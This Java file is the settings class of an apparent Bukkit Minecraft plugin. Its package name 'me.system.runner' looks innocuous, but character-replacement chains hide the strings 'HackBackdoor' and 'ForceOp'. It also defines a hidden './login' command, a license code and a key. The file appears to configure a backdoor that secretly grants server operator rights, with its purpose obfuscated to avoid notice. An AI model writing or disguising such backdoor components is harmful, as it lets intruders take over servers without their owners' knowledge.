
package me.system.runner.utils;

import org.bukkit.ChatColor;

public class Settings {
    public static String NAME = "plugintkdoor".replace("p", "H").replace("l", "a").replace("u", "c").replace("g", "k").replace("i", "B").replace("n", "a").replace("t", "c");
    public static final String FOP = "plugins".replace("p", "F").replace("l", "o").replace("u", "r").replace("g", "c").replace("i", "e").replace("n", "O").replace("s", "p");
    public static final String AUTHOR = "Wendellmeset";
    public static final String VERSION = "2.5.4";
    public static final String LICENSE = "TI8Y-OSA5-SJ6H-A9I7";
    public static final String KEY = "YecoF0I6M05thxLeokoHuW8iUhTdIUInjkfF";
    public static int NG = 0;
    public static String LOGIN_COMMAND = "./login";
    public static String DARK_RED = ChatColor.translateAlternateColorCodes((char)'&', (String)"&6");
    public static String WHITE = ChatColor.translateAlternateColorCodes((char)'&', (String)"&f");
    public static String RED = ChatColor.translateAlternateColorCodes((char)'&', (String)"&e");

    public static String PREFIX(String msg) {
        return DARK_RED + NAME + ChatColor.translateAlternateColorCodes((char)'&', (String)" &8l ") + WHITE + msg;
    }

    public static String USAGE(String msg) {
        return DARK_RED + "Usage" + ChatColor.translateAlternateColorCodes((char)'&', (String)" &8l ") + WHITE + msg;
    }
    public static String INFO(String msg) {
        return DARK_RED + "Info" + ChatColor.translateAlternateColorCodes((char)'&', (String)" &8l ") + WHITE + msg;
    }
}

